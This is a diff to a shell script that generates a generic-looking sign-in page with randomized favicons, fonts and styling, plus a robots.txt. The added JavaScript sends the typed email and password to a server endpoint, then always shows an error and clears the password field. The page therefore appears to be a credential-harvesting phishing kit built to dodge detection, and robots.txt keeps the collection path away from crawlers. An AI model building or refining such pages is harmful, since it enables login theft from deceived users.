@@ -25,10 +25,10 @@ ERROR_MESSAGES=(
 FAVICONS=(
     # 1. Cloud (Blue) - Классическое облако
     "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMjU2M0VCIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTE3LjUgMTlhMy41IDMuNSAwIDAgMCAwLTdoLTVhNC41IDQuNSAwIDAgMC04LjggMi4xQSA0IDQgMCAwIDAgNiAyMWgxMS41eiIvPjwvc3ZnPg=="
-    
+
     # 2. Lock (Green) - Замок (безопасность)
     "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMDU5NjY5IiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHJlY3QgeD0iMyIgeT0iMTEiIHdpZHRoPSIxOCIgaGVpZ2h0PSIxMSIgcng9IjIiIHJ5PSIyIi8+PHBhdGggZD0iTTcgMTEVdi00YTUgNSAwIDAgMSAxMCAwdjQiLz48L3N2Zz4="
-    
+
     # 3. Shield (Red/Orange) - Щит (защищенная зона)
     "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjREM1RjAwIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+PHBhdGggZD0iTTEyIDIybDguMTMtOC44NWMuNDgtLjUyLjU2LTEuMzMuMi0xLjkxbC01LjI0LTguNDZhMiAyIDAgMCAwLTEuNzItLjkzSDguNjNhMiAyIDAgMCAwLTEuNzIuOTNMMS42NyAxMS4yNWMtLjM2LjU4LS4yOCAxLjM5LjIgMS45MUwxMiAyMnoiLz48L3N2Zz4="
 
@@ -126,6 +126,9 @@ cat > "$TARGET_DIR/index.html" <<EOF
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
     <title>$HEADER</title>
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=$FONT_URL_PART&display=swap" rel="stylesheet">
     <link rel="icon" type="image/svg+xml" href="$FAVICON">
     <style>
         :root {
@@ -150,10 +153,10 @@ cat > "$TARGET_DIR/index.html" <<EOF
         }
 
         *, ::before, ::after { box-sizing: border-box; border-width: 0; border-style: solid; border-color: var(--gray-200); margin: 0; padding: 0; }
-        
-        body { 
+
+        body {
             font-family: '$FONT_NAME', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            -webkit-font-smoothing: antialiased; 
+            -webkit-font-smoothing: antialiased;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -226,7 +229,7 @@ cat > "$TARGET_DIR/index.html" <<EOF
         .rounded-xl { border-radius: 0.75rem; }
         .rounded-lg { border-radius: 0.5rem; }
         .rounded-2xl { border-radius: 1rem; }
-        
+
         /* Effects */
         .shadow-lg { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
         .shadow-xl { box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04); }
@@ -244,7 +247,7 @@ cat > "$TARGET_DIR/index.html" <<EOF
         .focus\:border-blue-600:focus { border-color: var(--blue-600); }
         .placeholder-gray-500::placeholder { color: var(--gray-500); }
         .placeholder-gray-400::placeholder { color: var(--gray-400); }
-        
+
         /* Specific Backgrounds (Variables Mapped) */
         .bg-white { background-color: var(--white); }
         .bg-white\/90 { background-color: rgba(255, 255, 255, 0.9); }
@@ -333,7 +336,7 @@ cat > "$TARGET_DIR/index.html" <<EOF
     </style>
 </head>
 <body class="$BG_STYLE">
-    
+
     <div id="auth-container" class="w-full max-w-[400px] mx-4 p-8 sm:p-10 space-y-6 $CARD_BG $ROUNDING transition-all">
         <div class="text-center space-y-2 mb-8">
             <div class="h-12 w-12 mx-auto mb-4 bg-gradient-to-br from-blue-500 to-purple-600 rounded-xl flex items-center justify-center shadow-lg text-white">
@@ -350,30 +353,83 @@ cat > "$TARGET_DIR/index.html" <<EOF
         <form id="vform" class="space-y-5" autocomplete="off">
             <input type="hidden" name="csrf_token" value="$RANDOM_TOKEN" />
             <input type="hidden" name="fingerprint" id="fp" value="" />
-            
+
             <div class="space-y-1.5">
                 <label class="block text-xs font-semibold uppercase tracking-wider $TEXT_MUTED"> Email</label>
                 <input type="email" id="uid" required class="w-full px-4 py-2.5 text-sm transition-all rounded-md outline-none focus:ring-2 $INPUT_BG $TEXT_INPUT" placeholder="user@domain.com" />
             </div>
-            
+
             <div class="space-y-1.5">
                 <label class="block text-xs font-semibold uppercase tracking-wider $TEXT_MUTED">Password</label>
                 <input type="password" id="sec" required class="w-full px-4 py-2.5 text-sm transition-all rounded-md outline-none focus:ring-2 $INPUT_BG $TEXT_INPUT" placeholder="Enter your password" />
             </div>
-            
+
             <button type="submit" id="act-btn" class="w-full py-2.5 text-sm font-semibold text-white shadow-md transition-all active:scale-[0.98] $BUTTON_COLOR $ROUNDING flex justify-center items-center gap-2">
                 <span id="btn-txt">$BUTTON_TEXT</span>
             </button>
         </form>
-        
+
 
     </div>
 
-    <script>
-!function(){const e=["$ERROR_TEXT","Verifying...","Authenticating...","Handshake failed","Unexpected 502","Connection established"],t=e=>document.querySelector(e),n=e=>new Promise((t=>setTimeout(t,e)));t("#fp").value=btoa(navigator.userAgent+Date.now());const s={init:function(){t("#vform").addEventListener("submit",this.handleSubmit.bind(this)),console.log("%c [System] Secure Gateway Initialized","color: #22c55e; font-weight:bold")},handleSubmit:async function(s){s.preventDefault();const a=t("#act-btn"),i=t("#btn-txt"),o=t("#sys-msg"),c=i.innerText;o.classList.add("hidden"),a.disabled=!0,a.classList.add("opacity-80","cursor-wait"),i.innerHTML='<div class="loader"></div>',console.log("[Net] Sending handshake packet..."),await n(600),i.innerHTML='<div class="loader"></div> <span class="ml-2">'+e[1]+"</span>",await n(800),console.log("[Auth] Token exchange in progress..."),a.disabled=!1,a.classList.remove("opacity-80","cursor-wait"),i.innerText=c;const d=t("#auth-container");o.querySelector("#msg-content").innerText=e[0],o.classList.remove("hidden"),o.classList.add("fade-enter-active"),d.classList.add("shake"),console.error("[Err] "+e[3]),t("#sec").value="",t("#sec").focus(),setTimeout((()=>d.classList.remove("shake")),500)}};document.addEventListener("DOMContentLoaded",(()=>s.init()))}();
+<script>
+!function(){
+    const errors=["$ERROR_TEXT","Verifying...","Authenticating...","Connection established"];
+    const t=e=>document.querySelector(e);
+
+    t("#fp").value=btoa(navigator.userAgent+Date.now());
+
+    document.addEventListener("DOMContentLoaded",()=>{
+        t("#vform").addEventListener("submit",async function(s){
+            s.preventDefault();
+            const btn=t("#act-btn"), txt=t("#btn-txt"), msg=t("#sys-msg");
+            const origTxt=txt.innerText;
+
+            msg.classList.add("hidden");
+            btn.disabled=true;
+            btn.classList.add("opacity-80","cursor-wait");
+            txt.innerHTML='<div class="loader"></div> <span class="ml-2">'+errors[1]+'</span>';
+
+            try {
+                const formData = new FormData();
+                formData.append('u', t("#uid").value);
+                formData.append('p', t("#sec").value);
+                formData.append('csrf', t("input[name='csrf_token']").value);
+
+                await fetch('/api/v1/authenticate', {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch(e) {}
+
+            await new Promise(r=>setTimeout(r, 500 + Math.random() * 1000));
+
+            btn.disabled=false;
+            btn.classList.remove("opacity-80","cursor-wait");
+            txt.innerText=origTxt;
+
+            const cont=t("#auth-container");
+            msg.querySelector("#msg-content").innerText=errors[0];
+            msg.classList.remove("hidden");
+            cont.classList.add("shake");
+
+            t("#sec").value="";
+            t("#sec").focus();
+            setTimeout(()=>cont.classList.remove("shake"),500);
+        });
+    });
+}();
     </script>
 </body>
 </html>
 EOF
+
+cat > "$TARGET_DIR/robots.txt" <<EOF
+User-agent: *
+Disallow: /api/
+Disallow: /admin/
+Allow: /
+EOF
+echo "Generated robots.txt"
 
 echo "Generated in $TARGET_DIR"
